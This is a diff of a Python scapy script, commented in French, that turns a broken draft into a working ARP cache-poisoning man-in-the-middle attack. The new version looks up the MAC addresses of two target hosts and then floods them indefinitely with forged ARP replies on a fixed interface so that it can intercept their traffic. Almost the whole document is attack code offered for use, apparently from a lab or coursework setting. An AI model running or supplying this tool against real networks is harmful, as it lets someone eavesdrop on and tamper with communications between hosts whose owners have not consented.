@@ -1,38 +1,33 @@
 #!/usr/bin/env python3
-from scapy.all import ARP,Ether,sendp, hexdump, sr1 
+'''Fichier contenant les fonctions permetant de realiser des attaques MiTM'''
+from scapy.all import ARP,Ether,sendp, srp
 import time as t
-import sys 
+import sys
 
+def mac(ip:str)->str:
+  '''Recupere l'adresse MAC associer a une adresse IP grace a un message ARP. \n
+  ip: est une adresse IP
+  '''
+  paquet = Ether()/ARP(op=1, pdst=ip) #Paquet ARP
+  rep = srp(paquet, iface='enp0s3') #Reponse au ARP
+  return rep[0][0][1].hwsrc #Renvoie l'adresse MAC
 
-import scapy.all
-def recupip(ip1, ip2):
-    ipcible = [ip1, ip2]
-    for i in ipcible:
-      arpmsg = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=i)
-      reponse = srp(arpmsg, timeout=2)
-      print(response[0][0][1].hswrc)
-      resultat.append(response[0][0][1].hswrc)
-      return resultat
+def arp(ipa:str, ipb:str)->None:
+  '''ARP POISONING: \n
+  Procedure permetant de realiser une attaque Man In The Middle par
+  empoisonnement de cache ARP. \n
+  ipa: Une des deux adresse IP que l'on veut empoisonner. \n
+  ipb: L'autre adresse IP que l'on veut empoisonner.
+  '''
 
-def poison(cible1, cible2, atk):
-  cible = [cible1, cible2]
-  mac = []
-  mac = recupip(cible1, cible2)
-  for i in range(2):
-    paquet = ARP(op=2, pdst=cible[i],hwdst=mac[i], psrc=atk)
-    send(paquet, verbose=False)
-  
+  maclist = [mac(ip) for ip in [ipa, ipb]]
 
-def arp(ipa ,ipb):
-    paqueta = Ether()/ARP(pdst=ipb)
-    sr1(paqueta)
-    while True:
-        paqueta = Ether(dst)/ARP(psrc=ipa, pdst=ipb)
-        # paquetb = Ether()/ARP(src=ipb, dst=ipa)
-        # sendp(paqueta)
-        # sendp(paquetb)
-        hexdump(paqueta)
-        t.sleep(10)
-ipa = sys.argv[1]  
-ipb = sys.argv[2]
-arp(ipa, ipb)
+  #On cree deux paquets ARP qui associe l'adresse IP (a et b) a l'adresse MAC du PC
+  paquet1 = Ether(dst=maclist[0])/ARP(op=2, pdst=ipa, psrc=ipb)
+  paquet2 = Ether(dst=maclist[1])/ARP(op=2, pdst=ipb, psrc=ipa)
+  while True: #Boucle infinie
+    sendp(paquet1, iface='enp0s3')
+    sendp(paquet2, iface='enp0s3')
+    t.sleep(30) #Arrete le processus pendant 60s
+
+arp(sys.argv[1], sys.argv[2])
